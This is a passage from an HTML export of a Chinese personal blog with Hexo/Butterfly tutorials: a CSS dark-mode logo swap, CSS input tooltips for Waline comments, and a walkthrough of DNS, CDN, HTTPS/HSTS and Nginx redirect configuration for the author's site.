                    <button class="btn" onclick="activeTag('CSS');">CSS</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/11/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/dncover.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>f06d4de6</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>使用CSS设定夜间模式时img使用的图片。</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!success] 本文已收录至 <a href="https://butterfly.zhheo.com/">Butterfly 主题美化教程</a></p>
</blockquote>
<p>Butterfly 主题中提供了夜间模式，夜间模式下，字体颜色、图片亮度等都会有所变化。</p>
<p>Butterfly 主题中没有提供网站 Logo 的夜间模式版本，本文章将给出解决方案。可以直接看实操部分节约你的时间。</p>
<h1>原理</h1>
<p>图标元素 HTML 代码如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711015010.png" alt="image.png"></p>
<p>我们可以通过选择出夜间模式的这个<code>img</code>元素，更改它的图片源即可达到目的。</p>
<h1>实操</h1>
<p>在主题配置文件中，你可能设置了网站的 logo：</p>
<pre><code class="language-yaml">nav:
  logo: https://cdn.gallery.uuanqin.top/img/logo-bc.png
</code></pre>
<p>如果想要在夜间模式下换个 Logo，可以新建 CSS 写入以下内容：</p>
<pre><code class="language-css">[data-theme='dark'] img.site-icon {
    content: url(https://cdn.gallery.uuanqin.top/img/logo-dw.png);
}
</code></pre>
<p>url 里填的是你想在夜间模式显示的 Logo。</p>
<p>将此 CSS 文件 引入主题中。Butterfly 主题的方法为在主题配置文件的 inject 部分引入 CSS，如：</p>
<pre><code class="language-yaml">inject:
  head:
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;your css&quot;&gt;
  bottom:
    - &lt;script src=&quot;your js&quot;&gt;&lt;/script&gt;
</code></pre>
<h1>效果</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711205253.png" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711205240.png" alt="image.png"></p>
<p>大功告成！</p>
<h1>举一反三</h1>
<p>只要你的 CSS 筛选器定位到图片，就可以进行在夜间模式替换图片。</p>
<p>效果：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711205050.png" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711205108.png" alt="image.png"></p>
<p>高级多了~😍</p>
<p>此外，理论上讲，利用这一点不管是不是图片，只要被 CSS 选择器选中就可以设置其夜间模式效果。基于此我把与夜间模式相关的调整都放在了 darktheme_modify.css 中，再进行 inject。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/qq_31279347/article/details/88653807"> css 如何定义 img 的 src_lizhi_ma 的博客-CSDN 博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="152796589">
                            <a href="#152796589">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 自定义页脚（不修改主题源码）</span>
                                
                                <div class="record-links-context hover">
                                    <p>关于夜间模式的问题详见：<a href="#4033695206" title="Butterfly 夜间模式变换顶部网站图标" class="record-link highlight">Butterfly 夜间模式变换顶部网站图标</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1215492985">
                            <a href="#1215492985">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>装点你的 Butterfly 博客</span>
                                
                                <div class="record-links-context hover">
                                    <p>夜间模式更改网站图标：<a href="#4033695206" title="Butterfly 夜间模式变换顶部网站图标" class="record-link highlight">Butterfly 夜间模式变换顶部网站图标</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3015602463" class="record">
            <header>
                <h1 class="record-title">为评论系统增加输入提醒【Waline】</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Waline');">Waline</button>
                    
                    <button class="btn" onclick="activeTag('CSS');">CSS</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/11/2023</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>b3be711f</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/promptcover.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>通过CSS设置实现信息输入提示。</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!success] 本文已收录至 <a href="https://butterfly.zhheo.com/">Butterfly 主题美化教程</a></p>
</blockquote>
<p>文章参考自 Leonus 文章 <a href="https://blog.leonus.cn/2022/inputAlert.html">给你的评论添加一个输入提醒吧 | Leonus</a>，文章原文的实现方案是针对于<strong>Twikoo</strong>评论系统的。本文以此为灵感摸索出针对<strong>Waline</strong>评论系统的实现方案。</p>
<blockquote>
<p>在这里再次感谢 <a href="https://blog.leonus.cn/">Leonus</a> 的优质教程以及对我实践过程中的疑惑解答！❤❤❤</p>
</blockquote>
<h1>效果</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711234615.png" alt="image.png"></p>
<h1>操作</h1>
<p><strong>Twikoo</strong> 评论系统实现方案参见 Leonus 的文章：<a href="https://blog.leonus.cn/2022/inputAlert.html">给你的评论添加一个输入提醒吧 | Leonus</a>，如有疑问直接与 Leonus 沟通。</p>
<p>下文将介绍 <strong>Waline</strong> 评论系统的实现方案。</p>
<p>引入以下 CSS：</p>
<pre><code class="language-css">/* waline 评论系统关键部分，不然会出现提示框均在同一位置的问题 */

.wl-header {
    overflow: visible;
}
.wl-header-item {
    position: relative;
}

/* end */

.wl-header-item:nth-child(1):before {
    content: '输入QQ号会自动获取昵称和头像🐧';
}

.wl-header-item:nth-child(2):before {
    content: '收到回复将通过的邮箱提醒您📧';
}

.wl-header-item:nth-child(3):before {
    content: '可以通过昵称访问您的网站🔗';
}

.wl-header-item:focus-within::before{
    display: block;
}

/* 主内容区 */
.wl-header-item::before {
    /* 先隐藏起来 */
    display: none;
    /* 绝对定位 */
    position: absolute;
    /* 向上移动60像素 */
    top: -31px;
    /* 文字强制不换行，防止left:50%导致的文字换行 */
    white-space: nowrap;
    /* 圆角 */
    border-radius: 10px;
    /* 距离左边50% */
    left: 50%;
    /* 然后再向左边挪动自身的一半，即可实现居中 */
    transform: translate(-50%);
    /* 填充 */
    padding: 0px 18px;
    background: #669900;
    color: #fff;
}
</code></pre>
<h1>更多</h1>
<p>如果想要实现下图效果，可参见文章 <a href="https://blog.leonus.cn/2022/inputAlert.html">给你的评论添加一个输入提醒吧 | Leonus</a></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711235642.png" alt="image.png"></p>
<p>（图源原文）</p>
<p>其他 Waline 评论区美化教程：<a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link ">定制自己的 Waline 评论系统</a></p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3709373237">
                            <a href="#3709373237">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>定制自己的 Waline 评论系统</span>
                                
                                <div class="record-links-context hover">
                                    <p>其他 Waline 评论区美化教程：<a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link highlight">定制自己的 Waline 评论系统</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1495212389">
                            <a href="#1495212389">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link ">定制自己的 Waline 评论系统</a></li>
<li><a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link highlight">为评论系统增加输入提醒【Waline】</a></li>
<li><a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link ">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3709373237">
                            <a href="#3709373237">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>定制自己的 Waline 评论系统</span>
                                
                                <div class="record-links-context hover">
                                    <p>如果想为评论区增加悬浮小气泡输入提醒，详见这篇文章：<a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link highlight">为评论系统增加输入提醒【Waline】</a></p>
<p>详看这篇文章：<a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link highlight">为评论系统增加输入提醒【Waline】</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2201181434" class="record">
            <header>
                <h1 class="record-title">博客域名解析管理与网站 CDN 加速域名配置</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Nginx');">Nginx</button>
                    
                    <button class="btn" onclick="activeTag('CDN');">CDN</button>
                    
                    <button class="btn" onclick="activeTag('阿里云');">阿里云</button>
                    
                    <button class="btn" onclick="activeTag('腾讯云');">腾讯云</button>
                    
                    <button class="btn" onclick="activeTag('DNS');">DNS</button>
                    
                    <button class="btn" onclick="activeTag('HSTS');">HSTS</button>
                    
                    <button class="btn" onclick="activeTag('HTTP');">HTTP</button>
                    
                    <button class="btn" onclick="activeTag('HTTPS');">HTTPS</button>
                    
                    <button class="btn" onclick="activeTag('SSL');">SSL</button>
                    
                    <button class="btn" onclick="activeTag('阿里巴巴');">阿里巴巴</button>
                    
                    <button class="btn" onclick="activeTag('腾讯');">腾讯</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/24/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/%E7%BD%91%E7%AB%99%E9%85%8D%E7%BD%AEcover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>精解本博客域名配置，建议熟悉 CDN、HTTPS 配置后参考。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>83335cfa</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>今天填了一个一直想填的坑，就是把博客域名的重定向、CDN 回源设置给弄好和捋顺了。以前的做法是 www.uuanqin.top 和 uuanqin.top 同时使用，CDN 也配置两条域名，但我总感觉不优雅、也不安全。通过学习一些<strong>网络相关知识</strong>，我自己尝试动手实验，绘制了<strong>域名解析流程图</strong>。此外把一些关键的<strong>具体配置分享</strong>出来并简要分析。</p>
<p>镇楼图先放出来：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230724025849.png" alt="image.png"></p>
<p>上图即为本站域名跳转关系，呕心沥血绘制......看着很复杂，实际也不太复杂。这张图体现的配置我还是感觉不太完美，限于目前的知识储备也就这样了，希望路过的大佬们在评论区指点迷津！！</p>
<blockquote>
<p>本文目的在于<strong>分享交流</strong>，所有操作仅供参考。</p>
</blockquote>
<blockquote>
<p>如果你是萌新站长，建议不要直接上手本篇文章内容，先弄明白这几篇文章循序渐进开始：</p>
<ol>
<li>拥有了域名，配置主机 A 记录，直接指向源站：<a href="https://help.aliyun.com/document_detail/29716.html?spm=a2c4g.11186623.0.0.37fc1f12nXmqC1">新手引导 (aliyun.com)</a></li>
<li>使用 CDN 服务，并加速域名：<a href="https://cloud.tencent.com/document/product/228/3149">内容分发网络 CDN 从零开始配置 CDN-快速入门-文档中心-腾讯云 (tencent.com)</a></li>
<li>网站使用 HTTPS：<a href="https://help.aliyun.com/document_detail/28534.html?spm=a2c4g.98728.0.0.4aa6115dQ3KtyS">SSL 证书使用指南 (aliyun.com)</a></li>
</ol>
</blockquote>
<h1>环境</h1>
<p>我的整个博客项目不同服务由不同服务商提供，之所以没选择 All in one 除了想自己边折腾边学习外，还是想让各种服务松耦合起来。</p>
<p>博客使用的服务以及部分软件系统版本如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">DNS 域名解析</th>
<th style="text-align:center">SSL 证书</th>
<th style="text-align:center">CDN 服务</th>
<th style="text-align:center">云服务器</th>
<th style="text-align:center">Web 服务</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">阿里云</td>
<td style="text-align:center">阿里云</td>
<td style="text-align:center">腾讯云</td>
<td style="text-align:center">阿里云 ECS Linux</td>
<td style="text-align:center">Nginx 1.22.1</td>
</tr>
</tbody>
</table>
<p>不管是阿里云还是腾讯云，相关服务的使用大差不差，本文只是给个思路。</p>
<h1>配置效果与原因</h1>
<p>理想的域名配置效果应该是这样的：</p>
<ol>
<li>用户在地址栏输入 www.uuanqin.top 时会直接重定向到 uuanqin.top，地址栏不显示 www 地址</li>
<li>所有 http 不安全链接自动指向 https 链接</li>
<li>使用 HSTS 在尽可能保证安全的同时减少重定向次数</li>
<li>精简 CDN 回源配置</li>
</ol>
<p>如果想直接看操作过程的跳下一节，想看原因的请继续往下阅读。</p>
<h2>301 重定向的优点（www 重定向到不带 www 的地址）</h2>
<p>你会发现互联网上一些网站的输入 www 开头网址跳转后，地址栏 www 会消失（或相反：不输 www 反而跳到显示 www，例如 <a href="http://baidu.com">baidu.com</a>）。它们都使用了一种非常重要的「自动转向」技术——301 重定向。</p>
<p>301 重定向（301 Move Permanently），指<strong>页面永久性转移</strong>，表示为资源或页面永久性地转移到了另一个位置。301 是 HTTP 协议中的一种<strong>状态码</strong>，当用户或搜索引擎向服务器发出浏览请求时，服务器返回的 HTTP 数据流中头信息（header）中包含状态码 301 ，表示该资源已经永久改变了位置。</p>
<p>过程如图：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230724020428.png" alt="image.png"></p>
<p>利用 301 重定向设置网站别名有利于网站首选域的确定，对于同一资源页面多条路径的 301 重定向有助于 URL 权重的集中，利于网站 SEO。</p>
<p>302 重定向（302 Move Temporarily），指页面<strong>暂时性转移</strong>，表示资源或页面暂时转移到另一个位置，常被用作网址劫持，容易导致网站降权，严重时网站会被封掉，不推荐使用。</p>
<p>搜索引擎是这样对待两种重定向的：</p>
<table>
<thead>
<tr>
<th style="text-align:center">重定向方式</th>
<th style="text-align:center">搜索引擎抓取操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">301 页面永久性转移</td>
<td style="text-align:center">抓取新内容的同时也将旧的网址替换成重定向之后的网址</td>
</tr>
<tr>
<td style="text-align:center">302 页面暂时性转移</td>
<td style="text-align:center">抓取新的内容而保存旧的网址并认为新的网址只是暂时的</td>
</tr>
</tbody>
</table>
<h2>HTTP 跳转到 HTTPS</h2>
<p>HTTP 协议也就是超文本传输协议，是一种使用<strong>明文数据</strong>传输的网络协议，不提供任何方式的数据加密。如果攻击者截取了 Web 浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息。</p>
<p>为了数据传输的安全，另一种协议 HTTPS（安全套接字层超文本传输协议）诞生。HTTPS 在 HTTP 的基础上加入了 SSL/TLS 协议，SSL/TLS 依靠证书来验证服务器的身份，并为浏览器和服务器之间的通信加密。</p>
<p>HTTP 和 HTTPS 使用的是完全不同的连接方式，同时使用的端口也不同，网络模型工作层不同：</p>
<table>
<thead>
<tr>
<th style="text-align:center">协议</th>
<th style="text-align:center">传输方式</th>
<th style="text-align:center">端口</th>
<th style="text-align:center">工作层</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">HTTP 超文本传输协议</td>
<td style="text-align:center">明文传输</td>
<td style="text-align:center">80</td>
<td style="text-align:center">应用层</td>
</tr>
<tr>
<td style="text-align:center">HTTPS 安全套接字层超文本传输协议</td>
<td style="text-align:center">SSL/TLS 协议加密</td>
<td style="text-align:center">443</td>
<td style="text-align:center">传输层</td>
</tr>
</tbody>
</table>
<p>HTTPS 有利于搜索排名的提升。百度和谷歌两大搜索引擎都已经明确表示，HTTPS 网站将会作为搜索排名的一个重要权重指标。也就是说 HTTPS 网站比起 HTTP 网站在搜索排名中更有优势。</p>
<h2>为什么使用 CDN？</h2>
<p>当用户直接访问源站中的静态内容时，可能面临的体验问题：</p>
<ul>
<li>客户离服务器越远，访问速度越慢。</li>
<li>客户数量越多，网络带宽费用越高。</li>
<li>跨境用户访问体验较差。</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230724022324.png" alt="image.png"></p>
<p>CDN 如何改善您的网络体验：</p>
<ul>
<li>CDN 缓存内容后，用户仅需要访问就近的 CDN 节点即可获取静态内容。</li>
<li>缓解源站带宽压力，网络费用更低。</li>
<li>分布全球的跨境节点提升跨境访问体验。</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230724022332.png" alt="image.png"></p>
<blockquote>
<p>[!hint] 为什么不要用 CDN？<br>
CDN 增加网站的被攻击风险，若安全措施没有实施到位，容易产生高额账单。</p>
</blockquote>
<h2>HSTS 是什么？</h2>
<p>上文提到 HTTPS 可以提高安全性，是“更加安全的 HTTP”，但 HTTPS 提供服务也不是安全的。</p>
<p>最初网站是通过 HTTP 协议提供服务，为了安全起见，网站升级为 HTTPS 协议，可是当用户在浏览器中输入网址时，例如 www.uuanqin.top ，而不是输入完整的 www.uuanqin.top ，浏览器会向网站<strong>发起一次 HTTP 请求</strong>，这时浏览器获取到一个重定向到 HTTPS 的请求（就像上文我们说的 301 重定向），然后再使用 HTTPS 协议通信。在这个过程中，我们使用了一次明文的 HTTP 请求和重定向，而这个过程很容易被攻击者利用，攻击者可以以中间人的方式劫持这次请求，从而进行后续的攻击，例如窃听数据，篡改请求和响应，跳转到钓鱼网站等。</p>
<p>为了避免这个问题，我们希望<strong>浏览器</strong>做到：当用户输入网址时（不带 https:// ）将其转换成 HTTPS 请求，从而绕过明文的 HTTP 请求和重定向。我们使用 HSTS 可以告诉浏览器这个网站是否是使用的 HTTPS。</p>
<p>HSTS 的全称是 HTTP Strict-Transport-Security，它是一个 Web 安全策略机制。HSTS 的核心是<strong>HTTP 响应头</strong>（HTTP Response Header），它告诉浏览器在接下来的一段时间，这个域名只能通过 HTTPS 进行访问，如果该域名在浏览器中出现不安全访问，HSTS 会强制用户的访问。</p>
<p>HSTS Header 中可以设置其过期时间，比如 1 年。注意如果网站 SSL 证书出现问题，那么用户在一年的时间里都没法正常访问你的网站了，当然，除非用户清除了浏览器缓存。</p>
<p>HSTS 也并不安全。假设浏览器中没有该域名的 HSTS 信息时，用户第一次访问该网站时，依然需要使用明文的 HTTP 请求和重定向，解决方法是 Preload List，感兴趣的同学可以自己搜索，这里就不再赘述。</p>
<h1>网址转换过程</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230724025849.png" alt="image.png"></p>
<p>过程图解析：</p>
<table>
<thead>
<tr>
<th style="text-align:center">浏览器有无 HSTS 缓存</th>
<th>用户在地址栏输入</th>
<th>路径</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">❌</td>
<td><a href="http://uuanqin.top">http://uuanqin.top</a></td>
<td>腾讯云 CDN 将其重定向至 HTTPS 再访问 CDN 边缘节点，同时浏览器存储 HSTS 缓存</td>
</tr>
<tr>
<td style="text-align:center">✅</td>
<td><a href="http://uuanqin.top">http://uuanqin.top</a></td>
<td>浏览器直接转换成 HTTPS 访问 CDN</td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td>http<strong>s</strong>: <a href="//uuanqin.top">//uuanqin.top</a></td>
<td>直接访问 CDN</td>
</tr>
<tr>
<td style="text-align:center">❌</td>
<td>http:// <strong>www.</strong> uuanqin.top</td>
<td>直接访问到服务器主机，Nginx 重定向至 <a href="https://uuanqin.top">https://uuanqin.top</a> 进行访问。过程中浏览器会存储 HSTS 缓存</td>
</tr>
<tr>
<td style="text-align:center">✅</td>
<td>http:// <strong>www.</strong> uuanqin.top</td>
<td>浏览器直接转换成 HTTPS，并直接访问到服务器主机，Nginx 重定向至 <a href="https://uuanqin.top">https://uuanqin.top</a> 进行访问</td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td>http<strong>s</strong>: // <strong>www.</strong> uuanqin.top</td>
<td>直接访问到服务器主机，Nginx 重定向至 <a href="https://uuanqin.top">https://uuanqin.top</a> 进行访问</td>
</tr>
</tbody>
</table>
<p>其中 uuanqin.top 为 CDN 加速域名。通常第一次访问时没有 HSTS 缓存。</p>
<blockquote>
<p>[!example] Q&amp;A<br>
<strong>为什么不在 CDN 同时设置两个加速域名？</strong></p>
<p>很长一段时间以来一直都是这样设置，但是我觉得每次刷新都要同时刷新两个域名很不优雅，且耗费更多回源流量。此外还无法设置 301 重定向，造成 www 与不含 www 的域名同时存在。</p>
<p>当然，流程图这种方式可能会暴露公网 IP，这是我认为本篇配置需要改变的原因。</p>
<p><strong>为什么 www 域名不使用 CNAME 指向？</strong></p>
<p>CNAME 不能达到“用户浏览器只显示无 www 网址”的目的。<s>（虽然这点好像不太重要，但我总是有这个执念）</s></p>
</blockquote>
<h1>操作</h1>
<p>作为新站长，一口气配置正确是不可能的，本文开头给出了循序渐进的配置参考，每一步都做正确了，配置才能逐渐成型。</p>
<p>我们可以将上一小节的目标简要拆解成以下三个配置任务：</p>
<p>a. 用户输入 <a href="http://uuanqin.top">http://uuanqin.top</a> 必须跳转到 https: <a href="//uuanqin.top">//uuanqin.top</a></p>
<p>b. 用户输入 http://<strong>www</strong>.uuanqin.top 必须跳转到 https: <a href="//uuanqin.top">//uuanqin.top</a></p>
<p>c. 用户输入 http<strong>s</strong>: //<strong>www</strong>.uuanqin.top 必须跳转到 https: <a href="//uuanqin.top">//uuanqin.top</a></p>
<h2>DNS 解析配置</h2>
<p>DNS 解析设置了这两条记录：</p>
<table>
<thead>
<tr>
<th>主机记录</th>
<th>记录类型</th>
<th>记录值</th>
</tr>
</thead>
<tbody>
<tr>
<td>@</td>
<td>A</td>
<td>服务器 IP 地址</td>
</tr>
<tr>
<td>www</td>
<td>CNAME</td>
<td>CDN 结点地址</td>
</tr>
</tbody>
</table>
<p>CNAME 记录的配置详看 CDN 中的要求。</p>
<h2>CDN 加速设置</h2>
<p>我假设你已经尝试过 CDN 了，你应该懂得啥是加速域名了吧。CDN 我只设置一个加速域名 uuanqin.top</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230724170143.png" alt="image.png"></p>
<p>在 HTTPS 设置中开启 301 强制跳转和 HSTS：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230724170240.png" alt="image.png"></p>
<p>到此则完成了<strong>任务 a.</strong></p>
<h2>Nginx 配置</h2>
<p>打开 Nginx 的配置文件（不同版本的 Nginx 配置文件路径不太一样，1.22.1 的在/etc/nginx/conf.d/default.conf 中）</p>
<p>处理 CDN 在进行源站回源时的请求：</p>
<pre><code class="language-conf">server {
     #HTTPS的默认访问端口443。
     #如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。
     listen 443 ssl;

     #填写证书绑定的域名
     server_name  localhost;

    #access_log  /var/log/nginx/host.access.log  main;

    location / {
        root   /var/www/uuanqin.top;
        index  index.html index.htm;
    }
    #404页面配置，别忘记了
    error_page  404              /404.html;

     #填写证书文件名称
     ssl_certificate conf.d/cert/www.uuanqin.top.pem;
     #填写证书私钥文件名称
     ssl_certificate_key conf.d/cert/www.uuanqin.top.key;

     ssl_session_cache shared:SSL:1m;
     ssl_session_timeout 5m;

     #默认加密套件
     ssl_ciphers HIGH:!aNULL:!MD5;

     #自定义设置使用的TLS协议的类型以及加密套件（以下为配置示例，请您自行评估是否需要配置）
     #TLS协议版本越高，HTTPS通信的安全性越高，但是相较于低版本TLS协议，高版本TLS协议对浏览器的兼容性较差。
     #ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
     #ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;

     #表示优先使用服务端加密套件。默认开启
     ssl_prefer_server_ciphers on;
}
</code></pre>
<p>将 http<strong>s</strong>: //<strong>www.</strong> uuanqin.top 重定向到 http<strong>s</strong>: <a href="//uuanqin.top">//uuanqin.top</a>，完成<strong>任务 c.</strong>：</p>
<pre><code class="language-conf">server {
     #HTTPS的默认访问端口443。
     #如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。
     listen 443 ssl;

     #填写证书绑定的域名
     server_name www.uuanqin.top;

     rewrite ^(.*) https://uuanqin.top$1 permanent;

     #填写证书文件名称
     ssl_certificate conf.d/cert/www.uuanqin.top.pem;
     #填写证书私钥文件名称
     ssl_certificate_key conf.d/cert/www.uuanqin.top.key;

     ssl_session_cache shared:SSL:1m;
     ssl_session_timeout 5m;

     #默认加密套件
     ssl_ciphers HIGH:!aNULL:!MD5;

     #自定义设置使用的TLS协议的类型以及加密套件（以下为配置示例，请您自行评估是否需要配置）
     #TLS协议版本越高，HTTPS通信的安全性越高，但是相较于低版本TLS协议，高版本TLS协议对浏览器的兼容性较差。
     #ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
     #ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;

     #表示优先使用服务端加密套件。默认开启
     ssl_prefer_server_ciphers on;

    #HSTS配置
    add_header Strict-Transport-Security &quot;max-age=3001&quot;;
}
</code></pre>
<p>其中 301 重定向关键：<code>rewrite ^(.*) https://uuanqin.top$1 permanent;</code></p>
<p>HSTS 配置：<code>add_header Strict-Transport-Security &quot;max-age=3001&quot;;</code>，解释：</p>
<ul>
<li>添加一个名为 <code>Strict-Transport-Security</code> 的 HTTP 响应头，并设置了 HSTS 的相关选项</li>
<li><code>max-age</code> 是必选参数，是一个以秒为单位的数值，它代表着 HSTS Header 的过期时间</li>
<li><code>includeSubDomains</code> 是可选参数，如果包含它，则意味着当前域名及其子域名均开启 HSTS 保护</li>
<li><code>preload</code> 是可选参数，只有当你申请将自己的域名加入到浏览器内置列表的时候才需要使用到，指示浏览器将网站添加到 HSTS 预加载列表中，以便所有浏览器都将始终使用 HTTPS 与网站建立连接。</li>
</ul>
<p>将 http: //<strong>www.</strong> uuanqin.top 重定向到 http<strong>s</strong>: <a href="//uuanqin.top">//uuanqin.top</a>，完成<strong>任务 b.</strong>。</p>
<pre><code class="language-conf"># 首次访问
server {
    listen 80;
    #填写证书绑定的域名
    server_name www.uuanqin.top;

    #将所有HTTP请求通过rewrite指令重定向到HTTPS。
    rewrite ^(.*) https://uuanqin.top$1 permanent;
}
</code></pre>
<h1>其他操作提示</h1>
<h2>清除浏览器（Chrome、Edge）的 HSTS 307 缓存</h2>
<p>配置 HSTS 后我们可以打开浏览器开发者工具，监视网络中包发送情况即可。有时候我们也需要清除 HSTS 的缓存。</p>
<p><strong>Chrome 浏览器</strong>打开 chrome://net-internals/#hsts （<strong>Edge 浏览器</strong>直接点这个链接也没问题，它会自动重定向）</p>
<p>先在 <strong>Query HSTS/PKP domain</strong> 查你被 307 Internal Redirect 的域名</p>
<ul>
<li>如果是 Not Found，这个就不是你要的答案</li>
<li>如果有內容，如下图，那就到 Delete domain security policies 输入你被 307 Internal Redirect 的网址，然后 Delete 它。</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230724035022.png" alt="image.png"></p>
<p>现在你能使用 HTTP 访问该网址了。</p>
<h1>Nginx 安装配置</h1>
<p>可参考这篇文章：<a href="#107080905" title="Nginx 的安装与反向代理配置" class="record-link ">Nginx 的安装与反向代理配置</a></p>
<h2>百度站长</h2>
<p>弄好之后可以在百度站长弄个 HTTPS 认证，测试自己的成果。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230724224936.png" alt="image.png"></p>
<h1>后记</h1>
<p>网站的图床也可以自定义域名和 HTTPS 等设置。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230824094234.png" alt="image.png"></p>
<h1>本文参考</h1>
<ul>
